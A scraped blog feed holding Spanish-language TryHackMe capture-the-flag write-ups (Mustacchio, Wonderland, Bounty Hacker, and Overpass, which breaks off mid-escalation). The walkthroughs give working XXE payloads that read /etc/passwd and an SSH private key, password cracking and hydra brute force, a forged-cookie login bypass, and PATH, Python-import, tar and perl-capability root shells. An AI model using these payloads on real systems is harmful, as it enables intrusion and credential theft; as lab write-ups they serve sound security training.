SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 581b0c0ffacf05be4cc07af1f188611c (RSA) | 256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA) |_ 256 9d59c6c779c554c41daae4d184710192 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home 8765/tcp open http nginx 1.10.3 (Ubuntu) |_http-title: Mustacchio | Login |_http-server-header: nginx/1.10.3 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Puerto 80 Al entrar a la web lo primero que vemos es lo siguiente:\nCon wfuzz vamos a buscar subdirectorios\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.131.18/FUZZ Entre todos los que encuentra hay uno llamdo custom que dentro tiene una carpeta llamada js y css. Dentro de js hay un archivo llamado users.bak. Al descargarnoslo con un strings podemos ver un usuario (admin) y un hash\nEse hash podemos probar de romperlo con la herramienta search the hash\nPuerto 8765 Dentro de este puerto hay otra web con un panel de login al cual podemos entrar con las credenciales que hemos conseguido antes. Al entrar vemos lo siguiente:\nSi lo dejamos en blanco sale una notificaciÃ³n que dice que tenemos que poner cÃ³digo XML\nViendo que abajo salen tres variables (Nombre, Autor y Comentario) podemos probar de poner un cÃ³digo XML con esos apartados.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;test1\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; Podemos probar de hacer una inyeccion xxe con el siguiente cÃ³digo xml para que muestre el archivo /etc/passwd\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY testxxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;testxxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; Â¡Funciona!\nUsando lo mismo podemos ver la \u0026ldquo;RSA PRIVATE KEY\u0026rdquo;. Esta vez en vez del \u0026ldquo;file://\u0026rdquo; he usado \u0026ldquo;php://filter/convert.base64-encode/resource=/\u0026rdquo; para que no pierda la estructura.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY testxxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;testxxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; La respuesta estÃ¡ encriptada con base64. La podemos desencriptar de la siguiente forma\necho \u0026#34;Respuesta en base64\u0026#34; | base64 -d La respuesta la guardamos en un archivo llamado id_rsa y le hacemos un chmod 400 id_rsa.\nLa \u0026ldquo;RSA PRIVATE KEY\u0026rdquo; estÃ¡ encriptada, la podemos desencriptar con john:\nssh2john id_rsa \u0026gt; hash.txt john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Ya tenemos unas credenciales para conectarnos por ssh\nEscalada de privilegios Dentro de /home/joe hay un archivo interesante\nbarry@mustacchio:/home/joe# file live_log live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped Con el comando strings podemos ver cadenas de texto, En una lÃ­nea se ve como ejecuta tail sin poner la ruta completa, nos podemos aprovechar de esto creando un tail en /tmp y aÃ±adiendo el /tmp en el path, de esta forma podremos ejecutar lo que queramos como root.\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/tail chmod +x /tmp/tail export PATH=/tmp:$PATH Â¡Ya somos root!\n","date":"2023-01-18","id":97,"permalink":"/writeups/tryhackme/mustacchio/","summary":"https://tryhackme.com/room/mustacchio\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","Mediana","Linux","xxe"],"title":"Mustacchio"},{"content":"","date":"2023-01-18","id":98,"permalink":"/tags/xxe/","summary":"","tags":[],"title":"xxe"},{"content":"","date":"2023-01-11","id":99,"permalink":"/tags/bash/","summary":"","tags":[],"title":"bash"},{"content":"","date":"2023-01-11","id":100,"permalink":"/tags/perl/","summary":"","tags":[],"title":"perl"},{"content":"https://tryhackme.com/room/wonderland\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.186.98 PING 10.10.186.98 (10.10.186.98) 56(84) bytes of data. 64 bytes from 10.10.186.98: icmp_seq=1 ttl=63 time=45.4 ms --- 10.10.186.98 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 45.355/45.355/45.355/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.186.98 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,80 -sC -sV 10.10.186.98 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8eeefb96cead70dd05a93b0db071b863 (RSA) | 256 7a927944164f204350a9a847e2c2be84 (ECDSA) |_ 256 000b8044e63d4b6947922c55147e2ac9 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. Web (Puerto 80) Reconocimiento web Al entrar a la web lo primero que vemos es lo siguiente\nCon ctrl + u podemos ver el codigo de la web. Vemos que saca la foto de un subdirectorio llamado img\n\u0026lt;img src=\u0026#34;/img/white_rabbit_1.jpg\u0026#34; style=\u0026#34;height: 50rem;\u0026#34;\u0026gt; Al entrar al directorio /img vemos que hay 2 fotos mÃ¡s\nalice_door.jpg alice_door.png white_rabbit_1.jpg Buscando archivos ocultos en las fotos Nos las pasamos a nuestra mÃ¡quina con wget:\nwget http://10.10.186.98/img/alice_door.jpg wget http://10.10.186.98/img/alice_door.png wget http://10.10.186.98/img/white_rabbit_1.jpg Con la herramienta steghide podemos comprobar si contienen archivos ocultos\nsteghide extract -sf white_rabbit_1.jpg Solo la foto white_rabbit_1.jpg contiene un archivo oculto, el cual dice lo siguiente\nfollow the r a b b i t\nBuscando subdirectorios Con wfuzz vamos a buscar subdirectorios en la web\nwfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.186.98/FUZZ Encuentra los siguientes subdirectorios:\nr img poem Al entrar en el /r vemos lo siguiente:\nVamos a volver a usar el wfuzz sobre el directorio /r\nwfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.186.98/r/FUZZ Nos encuentra un subdirectorio llamado a. Recordando la pista que habÃ­a en la primera foto \u0026ldquo;follow the r a b b i t\u0026rdquo; podemos intuir que habrÃ¡ un subdirectorio por cada letra de la palabra \u0026ldquo;rabbit\u0026rdquo;.\nDentro de http://10.10.186.98/r/a/b/b/i/t vemos lo siguiente\nPulsando ctrl + u para ver el cÃ³digo de la web podemos ver una lÃ­nea que dice un usuario y una contraseÃ±a\n\u0026lt;p style=\u0026#34;display: none;\u0026#34;\u0026gt;alice:--password-censurada--\u0026lt;/p\u0026gt; ssh (puerto 22) Ya nos podemos conectar por ssh con las credenciales anteriores\u0026hellip;\nssh alice@10.10.186.98 Escalada de privilegios Escalada a rabbit Dentro de la carpeta /home/alice/ vemos tres archivos\n-rw\u0026mdash;\u0026mdash;- root.txt -rw-r\u0026ndash;r\u0026ndash; walrus_and_the_carpenter.py Con sudo -l vemos que podemos ejecutar /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py como el usuario rabbit.\nViendo el cÃ³digo del archivo walrus_and_the_carpenter.py vemos que importa la librerÃ­a random para despuÃ©s usar la funciÃ³n choice.\nLo que podemos hacer es, en la misma carpeta crear un archivo llamado random.py, para que sea este archivo el que importe y no el de /usr/lib/python3.6/random.py y asi poder ejecutar cÃ³digo como rabbit.\nContenido del random.py:\nimport os def choice(a): os.system(\u0026#34;whoami\u0026#34;) Al ejecutar el walrus_and_the_carpenter.py sale lo siguiente:\nalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py rabbit The line was:\tNone Ahora si cambiamos el cÃ³digo del random.py a lo siguiente y volvemos a ejecutar el walrus_and_the_carpenter.py ya somos rabbit\nimport os def choice(a): os.system(\u0026#34;bash\u0026#34;) Escalada a hatter En /home/rabbit/ hay un archivo llamado teaParty que es un binario con permisos suid\n-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty\nAl ejecutarlo vemos lo siguiente:\nrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by Thu, 12 Jan 2023 15:48:13 +0000 Ask very nicely, and I will give you some tea while you wait for him Con el comando strings podemos ver cadenas de texto legible. Podemos ver que usa el comando date se ejecuta con la ruta relativa. Ejemplo (/bin/echo: Ruta absoluta / echo: Ruta relativa).\nNos podemos aprovechar de esto ejecutando lo siguiente:\nexport PATH=/tmp:$PATH La variable PATH es utilizada para especificar una lista de directorios separados por un delimitador (generalmente un dos puntos \u0026ldquo;:\u0026rdquo;) en los que el sistema operativo buscarÃ¡ ejecutables. En este caso, se agrega el directorio \u0026ldquo;/tmp\u0026rdquo; al inicio de la lista existente de directorios en PATH. Esto significa que el sistema operativo buscarÃ¡ primero en el directorio \u0026ldquo;/tmp\u0026rdquo; cuando se busque un ejecutable.\nAhora dentro de /tmp podemos crear un archivo llamado date con el siguiente cÃ³digo:\n#!/bin/bash bash Ya podemos ejecutar el teaParty y somos hatter\nEscalada a root En /home/hatter hay un archivo con su contraseÃ±a.\nEl comando \u0026ldquo;getcap\u0026rdquo; muestra los permisos de ejecuciÃ³n de los programas en el sistema de archivos raÃ­z (\u0026quot;/\u0026quot;)\nhatter@wonderland:/home/rabbit$ getcap -r / 2\u0026gt;/dev/null /usr/bin/perl5.26.1 = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/perl = cap_setuid+ep Si el binario tiene la capacidad CAP_SETUID de Linux establecida o es ejecutado por otro binario con la capacidad establecida, se puede usar como una puerta trasera para mantener el acceso privilegiado mediante la manipulaciÃ³n de su propio UID de proceso.\n/usr/bin/perl -e \u0026#39;use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; Ya somos root\n","date":"2023-01-11","id":101,"permalink":"/writeups/tryhackme/wonderland/","summary":"https://tryhackme.com/room/wonderland\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","Mediana","Linux","python","bash","perl"],"title":"Wonderland"},{"content":"https://tryhackme.com/room/cowboyhacker\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.131.60\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.131.60 PING 10.10.131.60 (10.10.131.60) 56(84) bytes of data. 64 bytes from 10.10.131.60: icmp_seq=1 ttl=63 time=57.5 ms --- 10.10.131.60 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 57.483/57.483/57.483/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.60 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.131.60 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p21,22,80 -sC -sV 10.10.131.60 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.18.80.135 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA) | 256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA) |_ 256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel FTP El nmap reporto que podemos acceder al ftp como anonymous.\nAl entrar vemos dos archivos los cuales nos podemos pasar con get a nuestra mÃ¡quina\nEn el archivo locks.txt vemos que hay una lista de a lo mejor posibles contraseÃ±as y en el task.txt vemos lo siguiente\n1.) Protect Vicious.\n2.) Plan for Red Eye pickup on the moon.\n-lin\n1.) Proteger a Vicious.\n2.) Plan para recoger a Red Eye en la luna.\n-lin\nYa tenemos un usuario (lin)\nSSH Con hydra vamos a intentar hacer fuerza bruta al usuario lin con las posibles contraseÃ±as del logs.txt que nos hemos pasado anteriormente a nuestra mÃ¡quina\nhydra -l lin -P locks.txt 10.10.131.60 ssh -t 40 Ya tenemos la contraseÃ±a\nEscalada de privilegios Con sudo -l y proporcionando la contraseÃ±a que hemos encontrado anteriormente vemos que el usuario lin puede ejecutar tar como root.\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh Ya somos root\n","date":"2023-01-08","id":102,"permalink":"/writeups/tryhackme/bounty-hacker/","summary":"https://tryhackme.com/room/cowboyhacker\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.131.60\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","tar"],"title":"Bounty Hacker"},{"content":"","date":"2023-01-08","id":103,"permalink":"/tags/tar/","summary":"","tags":[],"title":"tar"},{"content":"","date":"2023-01-07","id":104,"permalink":"/tags/crontab/","summary":"","tags":[],"title":"crontab"},{"content":"https://tryhackme.com/room/overpass\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.170.40\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.170.40 PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data. 64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms --- 10.10.170.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 217.508/217.508/217.508/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.170.40 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.170.40 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p 22,80 -sC -sV 10.10.170.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 20:15 CET Nmap scan report for 10.10.170.40 Host is up (0.052s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37968598d1009c1463d9b03475b1f957 (RSA) | 256 5375fac065daddb1e8dd40b8f6823924 (ECDSA) |_ 256 1c4ada1f36546da6c61700272e67759c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Web Con el whatweb podemos ver mÃ¡s informaciÃ³n sobre la web:\nâ¯ whatweb 10.10.170.40 http://10.10.170.40 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.170.40], Script, Title[Overpass], X-UA-Compatible[IE=edge] Al entrar a la web con lo primero que nos encontramos es esta pÃ¡gina\nBuscando Subdirectorios Con wfuzz vamos a buscar subdirectorios mediante el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000069: 301 0 L 0 W 0 Ch \u0026#34;downloads\u0026#34; 000000039: 301 0 L 0 W 0 Ch \u0026#34;img\u0026#34; 000000156: 301 0 L 0 W 0 Ch \u0026#34;aboutus\u0026#34; 000000259: 301 2 L 3 W 42 Ch \u0026#34;admin\u0026#34; 000000550: 301 0 L 0 W 0 Ch \u0026#34;css\u0026#34; InfiltraciÃ³n Dentro del /admin hay un panel de login. Viendo el codigÃ³ del /admin se puede ver que hay un login.js\n\u0026lt;script src=\u0026#34;/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; El cual contiene lo siguiente:\nasync function postData(url = \u0026#39;\u0026#39;, data = {}) { // Default options are marked with * const response = await fetch(url, { method: \u0026#39;POST\u0026#39;, // *GET, POST, PUT, DELETE, etc. cache: \u0026#39;no-cache\u0026#39;, // *default, no-cache, reload, force-cache, only-if-cached credentials: \u0026#39;same-origin\u0026#39;, // include, *same-origin, omit headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, redirect: \u0026#39;follow\u0026#39;, // manual, *follow, error referrerPolicy: \u0026#39;no-referrer\u0026#39;, // no-referrer, *client body: encodeFormData(data) // body data type must match \u0026#34;Content-Type\u0026#34; header }); return response; // We don\u0026#39;t always want JSON back } const encodeFormData = (data) =\u0026gt; { return Object.keys(data) .map(key =\u0026gt; encodeURIComponent(key) + \u0026#39;=\u0026#39; + encodeURIComponent(data[key])) .join(\u0026#39;\u0026amp;\u0026#39;); } function onLoad() { document.querySelector(\u0026#34;#loginForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, function (event) { //on pressing enter event.preventDefault() login() }); } async function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } } Lo que hace es: Se verifica la respuesta del servidor para comprobar si contiene la cadena \u0026ldquo;Incorrect credentials\u0026rdquo; (credenciales incorrectas), y si no se recibe, el script establece una cookie llamada \u0026ldquo;SessionToken\u0026rdquo; con el valor de la respuesta del servidor y redirige al usuario a la pÃ¡gina \u0026ldquo;/admin\u0026rdquo;.\nEntonces lo que podemos hacer es crear una cookie con el nombre \u0026ldquo;SessionToken\u0026rdquo; y el value random. Al recargar ya podemos entrar\nLo que vemos al recargar la pÃ¡gina, es una RSA private key.\nEsa private key la vamos a guardar en un archivo llamado id_rsa\nPrimero le damos los permisos:\nchmod 600 id_rsa En la rsa private key vemos que pone que estÃ  encriptada.\nPara conesguir la contraseÃ±a vamos a sacar el hash con ssh2john y despuÃ©s con john mediante un diccionario vamos a probar de crackearlo\nssh2john id_rsa \u0026gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash Ya tenemos la contraseÃ±a\nAhora nos conectamos por ssh como james con la id_rsa\nssh -i id_rsa james@10.10.45.54 Escalada de privilegios Con un cat /etc/crontab\nVemos que hace como root un curl a overpass.thm/downloads/src/buildscript.sh y despuÃ©s lo ejecuta con bash.\nTenemos permisos para editar el /etc/hosts\nAÃ±adimos lo siguiente en el /etc/hosts\n10.10.10.10 overpass.thm DespuÃ©s desde nuestra mÃ¡quina creamos las carpetas y el archivo que salen en la url del crontab\nâ¯ cat downloads/src/buildscript.sh 